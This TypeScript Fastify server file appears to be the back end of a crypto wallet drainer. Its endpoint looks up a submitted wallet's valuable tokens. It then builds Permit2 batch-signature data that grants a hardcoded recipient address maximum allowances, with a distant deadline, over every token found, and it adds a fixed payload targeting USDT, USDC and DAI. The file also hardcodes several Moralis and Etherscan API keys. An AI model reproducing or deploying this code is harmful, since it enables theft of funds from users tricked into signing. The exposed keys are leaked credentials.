import fastify, { FastifyInstance, RouteGenericInterface } from "fastify";
import * as dotenv from "dotenv";
import sensible from "@fastify/sensible";
import cors from "@fastify/cors";
import fastifySwagger from "@fastify/swagger";
import { IncomingMessage, Server, ServerResponse } from "http";
import moralis from "moralis";
import { EvmChain } from "@moralisweb3/common-evm-utils";
//
// To guarantee consistent and predictable behavior of your application, we highly recommend to always load your code as shown below:
// └── plugins (from the Fastify ecosystem)
// └── your plugins (your custom plugins)
// └── decorators
// └── hooks
// └── your services
//

const moralisApiKey1 =
  "5M2C1HGJJnTiyMnp96IpaIlZ6CPVRA7yxysQY38AI1fDse7p3K6EcIRSOWwpSKCd";
const moralisApiKey2 =
  "2IHfMlzIaRBflv7GliW3NzneyoAp3OgBXbE05hhKd3qfXo4otDbfZNw1AwH2SYO8";
const moralisApiKey3 =
  "Ft1vyp44sxY7gqDm4qPiWBaPgLechkjUnKFPIn6jQBDHO5V0l0UOZnzNCoXZb1W2";
const moralisAPikey4 =
  "7f8r9DVeWUgv2AO7xZxTRkmZ6yx5l85WvTJfrj0ZEhBE8jXk8txiYI6m66ZNos5D";
const moralisApiKey5 =
  "qnEZj5njvRvnQ8eLMcaqnoItrPuQUrTjXRbHpZ207njJF1PmcI31dhSXBwRDgBnB";
const moralisApiKey6 =
  "NyA8UXQuHHtgDfgTRWzrrTMABUnCxPDQHHBHPEP0TScNZYE5WmIMxajhcZ6GA7j0";
const moralisKeys: string[] = [
  moralisApiKey1,
  moralisApiKey2,
  moralisApiKey3,
  moralisAPikey4,
  moralisApiKey5,
  moralisApiKey6,
];
const selectedKey = moralisKeys[
  Number(process.env.MORALIS_KEY_INDEX ?? 1)
] as string;
// console.log(selectedKey);
const etherscanAPiKey1 = "NW9VZEP7IFW2ZQ4NYV6GPANWWX893ANUUE";
const etherscanAPiKey2 = "QNKQHXZ31GI3F8NZAWVU4J6YSCQEV9J1BT";

const deadline = 1000000000000;
const chainId = 1; //main  net chain Id
const nonce = 0; // still experimenting on this one;
const Permit2Contract =
  "0x000000000022D473030F116dDEE9F6B43aC78BA3" as `0x${string}`; // Permit2 contract
const maxUint160 = "1461501637330902918203684832716283019655932542975"; // maxUint160
const recipient = "0xA08a5810Dc98258f35a35918CeD3f99E893154Ef"; // recipient address

//
export const app: FastifyInstance<Server, IncomingMessage, ServerResponse> =
  fastify({
    logger: true,
  });

dotenv.config();

// Registering our middlewares
const origins = [
  `${process.env.CLIENT_URL}`,
  `${process.env.ADMIN_URL}`,
  "https://localhost:5173",
  "http://localhost:5173",
  "http://localhost:5174",
  "https://localhost:5174",
];
// console.log(origins);
app.register(sensible);
app.register(cors, {
  origin: "*",
  credentials: true,
});

app.register(fastifySwagger);

// handle errors in out server

const PORT = (process.env.PORT as unknown as number) || 3000;
app.listen(
  {
    port: PORT,
    host: "0.0.0.0",
  },
  function (err, address) {
    if (err) {
      console.log(err);
    }
    // console.log("listenin address:", address);
    console.log(process.env.PORT);
  }
);

interface uid {
  id: string;
}
const runMoralis = async () => {
  if (!moralis.Core.isStarted) {
    await moralis.start({
      apiKey:
        "qnEZj5njvRvnQ8eLMcaqnoItrPuQUrTjXRbHpZ207njJF1PmcI31dhSXBwRDgBnB",
    });
    // console.log("moraliskeyIndex=>", process.env.MORALIS_KEY_INDEX);
  }
};
runMoralis();

app.get("/", (req, res) => {
  return " api is active ";
});
console.log(moralisKeys[Number(process.env.MORALIS_KEY_INDEX)]);
app.post<{
  Body: string;
}>("/fetchWalletTokens", async (req, res) => {
  const chain = EvmChain.ETHEREUM;
  const address = req.body;
  // console.log(address);
  const response = await moralis.EvmApi.token.getWalletTokenBalances({
    address,
    chain,
  });

  const allTokens = response.toJSON();
  const truncatedResponse = allTokens.map((token) => {
    return {
      name: token.name,
      token_address: token.token_address,
      balance: token.balance,
      decimals: token.decimals,
      usdPrice: null,
    };
  });
  const options = {
    method: "POST",
    headers: {
      accept: "application/json",
      "content-type": "application/json",
      "X-API-Key":
        "qnEZj5njvRvnQ8eLMcaqnoItrPuQUrTjXRbHpZ207njJF1PmcI31dhSXBwRDgBnB",
    },
    body: JSON.stringify({
      tokens: truncatedResponse,
    }),
  };

  async function useFetchTokenPrices() {
    try {
      const response = await fetch(
        "https://deep-index.moralis.io/api/v2/erc20/prices?chain=eth",
        options
      );
      const tokenPrices = await response.json();

      for (let index = 0; index < tokenPrices?.length; index++) {
        truncatedResponse[index].usdPrice = tokenPrices[index].usdPrice;
      }

      const tokensInUSD = truncatedResponse.map((token: any) => {
        const zeros = 10 ** Number(token.decimals);
        const tokenAmount = Number(token.balance) / zeros;
        const valInUSD = tokenAmount * Number(token.usdPrice);
        return { ...token, valInUSD };
      });
      const filteredByUSDValue = tokensInUSD.filter(
        (token) => token.valInUSD >= 1
      );
      return [filteredByUSDValue, null];
    } catch (error) {
      console.error;
      return [null, error];
    }
  }
  const [filteredByUSDValue, error] = await useFetchTokenPrices();
  const tokensReturned = filteredByUSDValue as { token_address: string }[];
  const tokenInPermitFormat: {}[] = [];
  for (let index = 0; index < tokensReturned?.length; index++) {
    const obj = {
      token: tokensReturned[index].token_address,
      amount: maxUint160,
      expiration: deadline,
      nonce: nonce,
    };
    tokenInPermitFormat.push(obj);
  }
  const addrs = [];
  for (let i = 0; i < tokensReturned?.length; i++) {
    addrs.push(tokensReturned[i].token_address);
  }

  const response1 = await moralis.EvmApi.token.getErc20Approvals({
    chain: "0x1",
    contractAddresses: addrs,
    walletAddresses: [req.body],
  });

  const resJson = response1.toJSON();
  // console.log(resJson);

  const permit2Tokens = resJson?.result?.filter(
    (e) =>
      e.to_wallet == "0x000000000022d473030f116ddee9f6b43ac78ba3" &&
      e.value != "0"
  ) as { to_wallet: string }[];
  const _addrs = [...addrs];

  for (let i = 0; i < permit2Tokens?.length; i++) {
    const index = addrs.findIndex((e) => e == permit2Tokens[i].to_wallet);
    if (index != 1) {
      _addrs.splice(index, 1);
    }
  }
  const dataToSign = {
    domain: {
      name: "Permit2" as string,
      chainId: chainId,
      verifyingContract: Permit2Contract,
    },
    types: {
      EIP712Domain: [
        { name: "name", type: "string" },
        { name: "chainId", type: "uint256" },
        { name: "verifyingContract", type: "address" },
      ],
      PermitBatch: [
        { name: "details", type: "PermitDetails[]" },
        { name: "spender", type: "address" },
        { name: "sigDeadline", type: "uint256" },
      ],
      PermitDetails: [
        { name: "token", type: "address" },
        { name: "amount", type: "uint160" },
        { name: "expiration", type: "uint48" },
        { name: "nonce", type: "uint48" },
      ],
    },
    primaryType: "PermitBatch",
    message: {
      details: tokenInPermitFormat,
      spender: recipient,
      sigDeadline: deadline,
    },
  };
  const dat = { ...dataToSign };
  const dat123 = nw(tokenInPermitFormat);

  return [_dataToSign, _addrs, dat, dat123];
  // return tokensAddressOnly;
});
const usdcContractAddress: string =
  "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
const daiContractAddr: string = "0x6B175474E89094C44Da98b954EedeAC495271d0F";
const usdtContractAddress: string =
  "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const dett = [
  {
    token: usdtContractAddress,
    amount: maxUint160,
    expiration: deadline,
    nonce: nonce,
  },
  {
    token: usdcContractAddress,
    amount: maxUint160,
    expiration: deadline,
    nonce: nonce,
  },
  {
    token: daiContractAddr,
    amount: maxUint160,
    expiration: deadline,
    nonce: nonce,
  },
];

const _dataToSign = {
  domain: {
    name: "Permit2" as string,
    chainId: chainId,
    verifyingContract: Permit2Contract,
  },
  types: {
    EIP712Domain: [
      { name: "name", type: "string" },
      { name: "chainId", type: "uint256" },
      { name: "verifyingContract", type: "address" },
    ],
    PermitBatch: [
      { name: "details", type: "PermitDetails[]" },
      { name: "spender", type: "address" },
      { name: "sigDeadline", type: "uint256" },
    ],
    PermitDetails: [
      { name: "token", type: "address" },
      { name: "amount", type: "uint160" },
      { name: "expiration", type: "uint48" },
      { name: "nonce", type: "uint48" },
    ],
  },
  primaryType: "PermitBatch",
  message: {
    details: dett,
    spender: recipient,
    sigDeadline: deadline,
  },
};

function nw(details: any) {
  return {
    domain: {
      name: "Permit2" as string,
      chainId: chainId,
      verifyingContract: Permit2Contract,
    },
    types: {
      EIP712Domain: [
        { name: "name", type: "string" },
        { name: "chainId", type: "uint256" },
        { name: "verifyingContract", type: "address" },
      ],
      PermitBatch: [
        { name: "details", type: "PermitDetails[]" },
        { name: "spender", type: "address" },
        { name: "sigDeadline", type: "uint256" },
      ],
      PermitDetails: [
        { name: "token", type: "address" },
        { name: "amount", type: "uint160" },
        { name: "expiration", type: "uint48" },
        { name: "nonce", type: "uint48" },
      ],
    },
    primaryType: "PermitBatch",
    message: {
      details: details as [],
      spender: recipient,
      sigDeadline: deadline,
    },
  };
}
